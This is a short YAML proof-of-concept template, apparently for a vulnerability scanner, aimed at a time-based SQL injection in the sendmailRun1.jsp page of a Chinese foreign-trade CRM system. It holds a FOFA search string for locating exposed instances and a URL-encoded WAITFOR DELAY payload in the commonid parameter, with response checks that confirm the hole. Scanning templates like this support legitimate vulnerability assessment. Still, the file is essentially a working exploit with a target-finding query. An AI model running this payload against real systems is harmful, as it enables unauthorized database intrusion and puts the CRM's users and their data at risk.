id: poc-yaml-weidasoft-sendmailrun1-jsp-sqli
info:
  name: 维达外贸客户关系管理系统 sendmailRun1.jsp SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 维达外贸客户关系管理系统
  fofa: title="维达外贸客户关系管理系统"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /wap/common/sendmailRun1.jsp?commonid=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--%2Bq
  expression: status_code == 200 && contains(gbk_decode(body),"发送手机短信到相关人员") && contains(gbk_decode(body),"公告标题")
    && contains(gbk_decode(body),"写公告") && duration > t1 && duration < t2
transport: http
